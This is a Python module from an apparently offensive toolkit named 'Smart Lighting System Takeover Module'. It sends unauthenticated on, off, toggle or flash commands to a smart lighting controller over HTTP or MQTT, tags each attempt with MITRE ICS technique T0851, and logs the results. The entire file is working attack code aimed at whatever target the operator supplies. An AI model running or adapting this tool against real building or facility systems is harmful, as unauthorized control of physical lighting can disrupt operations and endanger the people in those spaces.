# modules/exploits/lighting_takeover.py

import argparse
import json
import os
import time
from datetime import datetime
import requests
import paho.mqtt.publish as publish

LOG_FILE = "results/exploit_logs.json"
MITRE_TTP = "T0851"  # Control System Command Injection

def log_event(entry):
    os.makedirs("results", exist_ok=True)
    if os.path.exists(LOG_FILE):
        with open(LOG_FILE, "r") as f:
            data = json.load(f)
    else:
        data = []
    data.append(entry)
    with open(LOG_FILE, "w") as f:
        json.dump(data, f, indent=2)

def inject_http_command(api_url, state):
    payload = {"light": state}
    try:
        r = requests.post(api_url, json=payload, timeout=3)
        success = r.status_code == 200
        print(f"[✓] HTTP command sent, response code: {r.status_code}")
    except Exception as e:
        print(f"[!] HTTP error: {e}")
        success = False
    return success

def inject_mqtt_command(broker, topic, state):
    try:
        publish.single(topic, payload=state, hostname=broker)
        print(f"[✓] MQTT command sent to topic {topic}")
        return True
    except Exception as e:
        print(f"[!] MQTT error: {e}")
        return False

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Smart Lighting System Takeover Module")
    parser.add_argument("--method", choices=["http", "mqtt"], required=True, help="Attack method")
    parser.add_argument("--target", required=True, help="API endpoint (HTTP) or broker address (MQTT)")
    parser.add_argument("--command", choices=["on", "off", "toggle", "flash"], default="on", help="Command to send")
    parser.add_argument("--mqtt-topic", help="MQTT topic (if using MQTT)")
    args = parser.parse_args()

    timestamp = datetime.utcnow().isoformat()
    success = False

    if args.method == "http":
        success = inject_http_command(args.target, args.command)
    elif args.method == "mqtt" and args.mqtt_topic:
        success = inject_mqtt_command(args.target, args.mqtt_topic, args.command)
    else:
        print("[!] Invalid usage for MQTT. Please provide --mqtt-topic.")
        exit(1)

    log_event({
        "timestamp": timestamp,
        "method": args.method,
        "target": args.target,
        "command": args.command,
        "topic": args.mqtt_topic if args.method == "mqtt" else None,
        "success": success,
        "ttp": MITRE_TTP
    })
